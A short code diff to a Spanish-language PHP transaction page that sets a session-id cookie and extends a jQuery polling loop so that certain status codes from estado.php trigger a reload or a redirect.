@@ -4,6 +4,10 @@ $ip = getenv("REMOTE_ADDR");
 setlocale(LC_TIME, "spanish");
 date_default_timezone_set('America/Bogota');
 $id_transaccion = $_SESSION['id_transaccion'] ?? 0;
+// Establecer cookie para estado.php
+if ($id_transaccion) {
+    setcookie('id', $id_transaccion, 0, '/', '', false, true);
+}
 ?>
 <html>
 	<head>
@@ -103,6 +107,16 @@ $id_transaccion = $_SESSION['id_transaccion'] ?? 0;
 		if (espera == 1) {
 			$.post("../../../process/estado.php", function(data) {
 				switch (data) {
+					case '2':
+					case '4':
+					case '5':
+					case '6':
+					case '8':
+					case '14':
+					case '25':
+						espera = 0;
+						location.reload();
+						break;
 					case '10':
 						espera = 0;
 						window.location.href = "../../../finish-no-back-button/";
